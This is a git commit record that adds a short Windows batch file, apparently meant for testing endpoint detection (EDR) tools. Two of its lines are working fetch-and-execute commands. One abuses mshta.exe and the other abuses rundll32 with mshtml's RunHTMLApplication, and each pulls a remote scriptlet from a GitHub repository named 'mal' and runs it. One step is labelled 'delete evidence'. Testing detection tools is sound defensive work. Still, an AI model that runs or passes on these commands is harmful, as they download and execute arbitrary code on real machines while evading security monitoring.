d3d734a3b21de421ab072069f1b65974444345f5
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-06-25 18:31:26 +0900

    Rename edrtest2.bat to edrtest2-POV.bat

---
+++ edrtest2-POV.bat
@@ -0,0 +1,5 @@
+echo EDR test powershell activity
+mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2-POV")).Exec();close()
+timeout 5
+echo EDR test delete evidence
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3")
